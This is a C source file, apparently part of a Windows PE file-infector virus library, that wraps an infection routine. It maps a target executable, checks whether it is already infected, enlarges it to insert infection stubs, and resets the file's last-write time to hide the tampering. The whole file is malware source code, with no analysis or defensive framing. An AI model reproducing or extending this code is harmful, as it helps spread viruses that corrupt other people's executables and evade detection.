/* file infection wrapper
 * shebaw
 */
#include <Windows.h>
#include "mem_map.h"
#include "infect.h"
#include "finfect.h"

int infect_file_hlp(const TCHAR *file_path, const struct infect_file_arg *arg,
		infection_status_cb status_cb)
{
	struct mmap_info minfo;
	struct inf_info pe_inf_info;
	size_t add_size;
	FILETIME wtime;
	int res;

	res = 0;
	pe_inf_info.inf_stubs = arg->inf_stubs;
	pe_inf_info.nstubs = arg->nstubs;

	if (!mem_map(file_path, READ_WRITE_ACCESS, OPEN_EXISTING, 0, &minfo))
		return INFLIB_ERR_FILE_IO;
	res = get_infection_status(minfo.map, minfo.map_size, status_cb);
	if (res == 0) {
		res = init_inf_info(minfo.map, minfo.map_size, &pe_inf_info, 
					arg->inf_p, arg->cr_p, &add_size);
		if (res == 0) {
			if (add_size) {
				/* unmap and enlarge and map the file */
				mem_unmap(&minfo);
				if (!mem_map(file_path, READ_WRITE_ACCESS, OPEN_EXISTING, add_size, &minfo))
					return INFLIB_ERR_FILE_IO;
			}
			/* get the last write time */
			GetFileTime(minfo.map_handle, NULL, NULL, &wtime);

			res = infect(minfo.map, &pe_inf_info);

			/* set the last write time back to the value prior to infection */
			SetFileTime(minfo.map_handle, NULL, NULL, &wtime);
		}
	}
	mem_unmap(&minfo);
	return res;
}

int infect_file(const TCHAR *file_path, const struct infect_file_arg *arg,
		infection_status_cb status_cb)
{
	int res;

	__try {
		res = infect_file_hlp(file_path, arg, status_cb);
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		/* exception occurs when a mapped file is removed unexpectedly
		 * ex: when a mapped file is on a flash disk and flash disk gets removed
		 */
		res = INFLIB_ERR_FILE_IO;
	}

	return res;
}